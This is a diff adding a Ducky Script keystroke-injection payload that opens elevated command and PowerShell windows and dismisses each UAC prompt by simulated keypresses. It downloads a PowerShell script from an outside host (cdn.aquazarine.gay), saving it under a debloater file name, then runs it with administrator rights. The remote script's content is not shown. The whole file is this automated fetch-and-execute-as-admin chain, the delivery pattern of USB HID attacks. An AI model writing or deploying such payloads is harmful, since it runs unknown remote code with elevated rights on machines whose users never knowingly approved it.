@@ -1,0 +1,33 @@
+GUI r
+STRING powershell start-process cmd -verb runas
+ENTER
+DELAY 1200
+LEFT
+ENTER
+DELAY 1000
+STRING cd ..
+ENTER
+STRING cd ..
+ENTER
+DELAY 50
+STRING curl https://cdn.aquazarine.gay/Jraa5BiO.ps1 --output Windows10SysPrepDebloater.ps1
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+GUI r
+DELAY 50
+STRING powershell start-process powershell -verb runas
+ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 1500
+STRING cd ..
+ENTER
+DELAY 100
+STRING cd ..
+ENTER
+DELAY 100
+STRING ./Windows10SysPrepDebloater.ps1 -Debloat -Privacy
+ENTER
